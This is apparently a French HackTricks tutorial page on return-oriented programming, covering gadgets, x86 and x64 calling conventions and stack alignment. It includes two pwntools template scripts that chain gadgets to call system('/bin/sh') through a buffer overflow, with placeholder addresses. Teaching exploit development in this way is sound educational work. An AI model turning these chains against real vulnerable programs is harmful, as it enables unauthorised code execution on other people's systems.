# ROP - Programmation Orient√©e Retour

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## **Informations de Base**

**Programmation Orient√©e Retour (ROP)** est une technique d'exploitation avanc√©e utilis√©e pour contourner des mesures de s√©curit√© telles que **No-Execute (NX)** ou **Data Execution Prevention (DEP)**. Au lieu d'injecter et d'ex√©cuter du shellcode, un attaquant exploite des morceaux de code d√©j√† pr√©sents dans le binaire ou dans les biblioth√®ques charg√©es, connus sous le nom de **"gadgets"**. Chaque gadget se termine g√©n√©ralement par une instruction `ret` et effectue une petite op√©ration, comme d√©placer des donn√©es entre des registres ou effectuer des op√©rations arithm√©tiques. En encha√Ænant ces gadgets, un attaquant peut construire un payload pour effectuer des op√©rations arbitraires, contournant ainsi efficacement les protections NX/DEP.

### Comment fonctionne ROP

1. **D√©tournement de Flux de Contr√¥le** : Tout d'abord, un attaquant doit d√©tourner le flux de contr√¥le d'un programme, g√©n√©ralement en exploitant un d√©bordement de tampon pour √©craser une adresse de retour sauvegard√©e sur la pile.
2. **Encha√Ænement de Gadgets** : L'attaquant s√©lectionne ensuite soigneusement et encha√Æne des gadgets pour effectuer les actions souhait√©es. Cela peut impliquer la configuration des arguments pour un appel de fonction, l'appel de la fonction (par exemple, `system("/bin/sh")`), et la gestion de tout nettoyage ou op√©rations suppl√©mentaires n√©cessaires.
3. **Ex√©cution du Payload** : Lorsque la fonction vuln√©rable retourne, au lieu de retourner √† un emplacement l√©gitime, elle commence √† ex√©cuter la cha√Æne de gadgets.

### Outils

Typiquement, les gadgets peuvent √™tre trouv√©s en utilisant **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** ou directement √† partir de **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Exemple de Cha√Æne ROP en x86

### **Conventions d'Appel x86 (32 bits)**

* **cdecl** : L'appelant nettoie la pile. Les arguments de fonction sont pouss√©s sur la pile dans l'ordre inverse (de droite √† gauche). **Les arguments sont pouss√©s sur la pile de droite √† gauche.**
* **stdcall** : Semblable √† cdecl, mais l'appel√© est responsable du nettoyage de la pile.

### **Trouver des Gadgets**

Tout d'abord, supposons que nous avons identifi√© les gadgets n√©cessaires dans le binaire ou ses biblioth√®ques charg√©es. Les gadgets qui nous int√©ressent sont :

* `pop eax; ret` : Ce gadget extrait la valeur du haut de la pile dans le registre `EAX` et retourne, nous permettant de contr√¥ler `EAX`.
* `pop ebx; ret` : Semblable √† ce qui pr√©c√®de, mais pour le registre `EBX`, permettant de contr√¥ler `EBX`.
* `mov [ebx], eax; ret` : D√©place la valeur dans `EAX` vers l'emplacement m√©moire point√© par `EBX` et retourne. Cela est souvent appel√© un **gadget write-what-where**.
* De plus, nous avons l'adresse de la fonction `system()` disponible.

### **Cha√Æne ROP**

En utilisant **pwntools**, nous pr√©parons la pile pour l'ex√©cution de la cha√Æne ROP comme suit, visant √† ex√©cuter `system('/bin/sh')`, notez comment la cha√Æne commence par :

1. Une instruction `ret` pour des raisons d'alignement (optionnel)
2. Adresse de la fonction `system` (supposant ASLR d√©sactiv√© et libc connue, plus d'infos dans [**Ret2lib**](ret2lib/))
3. Espace r√©serv√© pour l'adresse de retour de `system()`
4. Adresse de la cha√Æne `"/bin/sh"` (param√®tre pour la fonction system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Cha√Æne ROP dans l'exemple x64

### **x64 (64 bits) Conventions d'appel**

* Utilise la convention d'appel **System V AMD64 ABI** sur les syst√®mes de type Unix, o√π les **six premiers arguments entiers ou pointeurs sont pass√©s dans les registres `RDI`, `RSI`, `RDX`, `RCX`, `R8` et `R9`**. Les arguments suppl√©mentaires sont pass√©s sur la pile. La valeur de retour est plac√©e dans `RAX`.
* La convention d'appel **Windows x64** utilise `RCX`, `RDX`, `R8` et `R9` pour les quatre premiers arguments entiers ou pointeurs, avec des arguments suppl√©mentaires pass√©s sur la pile. La valeur de retour est plac√©e dans `RAX`.
* **Registres** : Les registres 64 bits incluent `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, et `R8` √† `R15`.

#### **Trouver des gadgets**

Pour notre objectif, concentrons-nous sur les gadgets qui nous permettront de d√©finir le registre **RDI** (pour passer la cha√Æne **"/bin/sh"** comme argument √† **system()**) et ensuite d'appeler la fonction **system()**. Nous supposerons que nous avons identifi√© les gadgets suivants :

* **pop rdi; ret** : Pousse la valeur du haut de la pile dans **RDI** et retourne ensuite. Essentiel pour d√©finir notre argument pour **system()**.
* **ret** : Un simple retour, utile pour l'alignement de la pile dans certains sc√©narios.

Et nous connaissons l'adresse de la fonction **system()**.

### **Cha√Æne ROP**

Ci-dessous un exemple utilisant **pwntools** pour configurer et ex√©cuter une cha√Æne ROP visant √† ex√©cuter **system('/bin/sh')** sur **x64** :
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Dans cet exemple :

* Nous utilisons le gadget **`pop rdi; ret`** pour d√©finir **`RDI`** √† l'adresse de **`"/bin/sh"`**.
* Nous sautons directement √† **`system()`** apr√®s avoir d√©fini **`RDI`**, avec l'adresse de **system()** dans la cha√Æne.
* **`ret_gadget`** est utilis√© pour l'alignement si l'environnement cible l'exige, ce qui est plus courant dans **x64** pour garantir un alignement correct de la pile avant d'appeler des fonctions.

### Alignement de la Pile

**L'ABI x86-64** garantit que la **pile est align√©e sur 16 octets** lorsqu'une **instruction d'appel** est ex√©cut√©e. **LIBC**, pour optimiser les performances, **utilise des instructions SSE** (comme **movaps**) qui n√©cessitent cet alignement. Si la pile n'est pas correctement align√©e (c'est-√†-dire que **RSP** n'est pas un multiple de 16), les appels √† des fonctions comme **system** √©choueront dans une **cha√Æne ROP**. Pour corriger cela, il suffit d'ajouter un **gadget ret** avant d'appeler **system** dans votre cha√Æne ROP.

## Diff√©rence principale entre x86 et x64

{% hint style="success" %}
Puisque x64 utilise des registres pour les premiers arguments, il n√©cessite souvent moins de gadgets que x86 pour des appels de fonction simples, mais trouver et encha√Æner les bons gadgets peut √™tre plus complexe en raison du nombre accru de registres et de l'espace d'adressage plus grand. Le nombre accru de registres et l'espace d'adressage plus grand dans l'architecture **x64** offrent √† la fois des opportunit√©s et des d√©fis pour le d√©veloppement d'exploits, en particulier dans le contexte de la Programmation Orient√©e Retour (ROP).
{% endhint %}

## Protections

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Autres Exemples & R√©f√©rences

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Techniques bas√©es sur ROP

Remarquez que ROP est juste une technique pour ex√©cuter du code arbitraire. Bas√© sur ROP, de nombreuses techniques Ret2XXX ont √©t√© d√©velopp√©es :

* **Ret2lib** : Utiliser ROP pour appeler des fonctions arbitraires d'une biblioth√®que charg√©e avec des param√®tres arbitraires (g√©n√©ralement quelque chose comme `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall** : Utiliser ROP pour pr√©parer un appel √† un syscall, par exemple `execve`, et le faire ex√©cuter des commandes arbitraires.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining** : Le premier abus sera EBP au lieu de EIP pour contr√¥ler le flux et le second est similaire √† Ret2lib mais dans ce cas, le flux est contr√¥l√© principalement avec des adresses EBP (bien qu'il soit √©galement n√©cessaire de contr√¥ler EIP).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
